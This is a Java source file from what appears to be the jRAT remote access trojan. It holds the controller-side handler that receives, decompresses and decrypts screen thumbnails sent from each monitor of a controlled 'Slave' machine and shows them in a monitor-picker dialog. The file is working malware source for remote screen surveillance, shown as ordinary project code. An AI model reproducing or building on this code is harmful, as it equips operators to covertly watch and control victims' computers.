package se.jrat.client.packets.incoming;

import java.awt.image.BufferedImage;
import java.io.DataInputStream;
import java.util.List;

import se.jrat.client.Slave;
import se.jrat.client.ui.dialogs.DialogPickMonitor;
import se.jrat.common.compress.GZip;
import se.jrat.common.crypto.Crypto;
import se.jrat.common.utils.ImageUtils;

import com.redpois0n.graphs.monitors.PanelMonitors.PanelMonitor;

public class Packet71AllThumbnails extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		int monitors = dis.readInt();
		
		for (int i = 0; i < monitors; i++) {
			int len = dis.readInt();
			
			byte[] buffer = new byte[len];

			dis.readFully(buffer);
			
			BufferedImage image = ImageUtils.decodeImage(Crypto.decrypt(GZip.decompress(buffer), slave.getKey()));
			
			DialogPickMonitor dialog = DialogPickMonitor.instances.get(slave);
			
			if (dialog != null) {
				List<PanelMonitor> panels = dialog.getPanelMonitors().getPanels();
				
				panels.get(i).setThumbnail(image);
			}
		}
	}

}
